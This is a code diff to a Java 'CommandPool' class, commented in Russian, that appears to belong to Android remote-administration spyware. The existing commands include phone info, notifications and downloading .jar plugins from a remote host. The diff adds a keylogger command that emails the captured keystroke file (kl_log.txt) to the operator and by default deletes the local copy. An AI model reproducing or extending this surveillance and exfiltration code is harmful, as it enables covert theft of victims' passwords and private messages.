@@ -154,6 +154,7 @@ public class CommandPool {
 		Add(new CommandObjStats(CommandObj.CMD_STATS,"получить инфу о телефоне"));
 		Add(new CommandObjNotify(CommandObj.CMD_NOTIFY,"text:<message> - вывести сообщение в область уведомлений"));
 		Add(new CommandObjPlugin(CommandObj.CMD_PLUGIN,"[get:<http://<host>/<plugin>.jar][remove:<command or <plugin>.jar>][list]"));
+		Add(new CommandObjGetKeyLog(CommandObj.CMD_GET_KEYLOG,"[off|on] - запустить кейлоггер"));
 		
 		//Add(new CommandObjInvoke(CommandObj.CMD_INVOKE,"[command name] [params..]"));
 		//Add(new CommandObjKeepAlive(CommandObj.CMD_KEEPALIVE,"time:HHMM;[off] - рапортовать о состоянии каждые сутки в <HHMM>"));
@@ -1804,9 +1805,28 @@ public class CommandPool {
 			} 
 			return list();
 		}
+	} // Plugin
+
+	
+	//
+	//XXX KEYLOG
+	//
+	public class CommandObjGetKeyLog extends CommandObj {
+		public CommandObjGetKeyLog(String name,String help) {
+			super(name,help);
+		}
 		
+		public int Invoke() throws Exception {
+			setResult("Файл кейлога выслан на почту");
+			boolean keepOld = mArgs.hasOpt("keep");
+			Mail mail = createMail();
+			String fileName = CommandObj.getFile(mContext, "kl_log.txt", false);
+			mail.addAttachment(fileName,"keylog.txt", !keepOld);
+			mail.send();
+			return CommandObj.ACK;
+		}
 		
-	}
+	}// KeyLog
 }
 
 
